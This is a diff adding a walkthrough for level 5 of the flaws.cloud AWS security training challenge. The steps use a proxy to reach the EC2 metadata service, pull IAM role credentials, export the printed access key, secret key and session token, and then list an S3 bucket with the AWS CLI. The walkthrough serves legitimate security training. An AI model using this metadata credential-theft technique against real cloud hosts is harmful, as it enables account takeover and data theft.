@@ -1,0 +1,69 @@
+To begin, click on the first link on the flaws level 5 page. This will take you to the home page of the flaws challenge.
+
+In this instance, you will need to get the 'magic' IP address to progress further. To find this, go to 'hint 1' in level 5 page. 
+
+Magic IP address is 169.254.169.254/ Enter this in the URL after '/proxy/.
+
+A webpage containing timestamps should now be visible. in the url after the IP address, insert '/latest'. Hit enter. 
+
+A webpage consisting of options 'meta-data' and 'user-data' will now appear. In URL after /latest, enter '/meta-data'
+
+A webpage with various options should now appear. We want the 'iam/' option in the list. In url after /meta-data, enter '/iam'
+
+A webpage containing options, including 'security-credentials' will appear. In url after /iam, enter '/security-credentials'
+
+A webpage containing details about the AccessKeyID, SecrectAccessKey and Token should now appear. We want to download these
+into our directory. To do this, open your command prompt/terminal and use export commands. make sure to copy and paste the
+codes found in the webpage (e.g. AccessKeyID is ASIA6GG7PSQG4HOLGCPB)
+
+  -export AWS_ACCESS_KEY_ID=ASIA6GG7PSQG4HOLGCPB
+  -export AWS_SECRET_ACCESS_KEY=n++QA6FBU/0dh5jMzjTNJnXhIS6KV8wn0F01iKkN
+  -export AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEDcaCXVzLXdlc3QtMiJHMEUCIQC0BkM9I7X7BPsDsTkqg0+siqXqcPpD0/8GH+Xqa7L0KQIgARyjWhpfgsIWdzJC991gBQBqtoJIeLMdEdt6JTWQAY8q+gMIEBACGgw5NzU0MjYyNjIwMjkiDMZs59A/bdcZ48TzQSrXA5uBS1zjetEO+yfSNXDWw9ox6LVwA/FTfb9QDlraOaF5kxCk1Dt3+tVDXr8/u7qlYrPqV2fMj/YN4lP09Njkn4P2pnOZCeGPnzDjs9VSFEVvPh9rJoQ+sVU1fs3a3oxp28RWZAcafdA6L2/C2A0K0LI+2csvOd4ZDxwUW5Fjg2E03nzruam2xmntlGMbNRPr6bA3MnLXCJBeRe2oqEf7LGThHvf3HYdl+Gb75vmmgLRVnqR8fpddkej7/NyL6Tw34EShd9sEITbVp91dtZyK3Sok4cWuKZHwIjxN5UqnWTiXtQB9v2UB3NHJa4z2Pdf5C2PLBMpr7VqTen/Sh2BxlcmF7C3z6Z5ALUW4nykyu0jrQ+BuWYA0MHyw6DPTBDSTN6YWdZH2iIab8P8LsANCDYMr7Cnt77lRLFuKknLFPtfExVkNesKCvzL4ni6yGp6DS0sVOhQiOHBxTroNfJjLytUkToAS2zSD4zofiClmCNKIzBjziYhoSUSN2OWTOXRGvfQLXGxGZdylllPM5L4ITjHRko9zQa/ZtVdwUW3plkrOxgyfWBYyZsTZUd6rqzuLWXtmeSA8TkDeC6okMkhbOWXvXZ/MI0jm629iS/13gLJoc+2wZ+GwazDvvJyNBjqlAfvtmqw0gyFCS9ye6tXOMQRoJVgh2jFF51rS5VwAQ6t6KgBebduvCbMOJ7rNT/kVEEVJ6IdjJGhpLbwMpnFWo+zMRRLE5S7pQaXaVAV4TfiUa8tS3/fw3WHZ9pDxvuQg1G4Ws1C2IyD46D8LeV1MuYha3AEUYuXvc7Kg0eS01j9dF7nTT6kMG4abIyszOeWEjmirsdf1OW1q530cBskvMlC5KBmlsg==
+
+Go back to the flaws level 5 page and copy the url for level 6 bucket.
+
+Go to command prompt and issue the following commands to complete the level: 
+
+-aws sts get-caller-identity
+
+    (RESULT)
+
+    {
+      "UserId": "AROAI3DXO3QJ4JAWIIQ5S:i-05bef8a081f307783",
+      "Account": "975426262029",
+      "Arn": "arn:aws:sts::975426262029:assumed-role/flaws/i-05bef8a081f307783"
+    }
+
+-aws s3api list-objects-v2 --bucket level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud --region us-west-2
+
+    (RESULT)
+    
+    {
+    "Contents": [
+        {
+            "Key": "ddcc78ff/hint1.html",
+            "LastModified": "2017-03-03T04:36:23+00:00",
+            "ETag": "\"9d5aa0c151e681b76f21d47d4b295f9e\"",
+            "Size": 2463,
+            "StorageClass": "STANDARD"
+        },
+        {
+            "Key": "ddcc78ff/hint2.html",
+            "LastModified": "2017-03-03T04:36:23+00:00",
+            "ETag": "\"46852b6abada0f2b57b66f9b4cf1dfbb\"",
+            "Size": 2080,
+            "StorageClass": "STANDARD"
+        },
+        {
+            "Key": "ddcc78ff/index.html",
+            "LastModified": "2020-05-22T18:42:20+00:00",
+            "ETag": "\"ae66f2837680f5688b92d8eb3c4b24fa\"",
+            "Size": 2924,
+            "StorageClass": "STANDARD"
+        },
+        {
+            "Key": "index.html",
+            "LastModified": "2017-02-27T02:11:07+00:00",
+            
+the result 'ddcc78ff' is required to gain access to level 6. In order to do this, you will need to enter
+in the url after flaws.cloud section to 'ddcc78ff/' end of url should be 'flaws.cloud/ddcc78ff/'
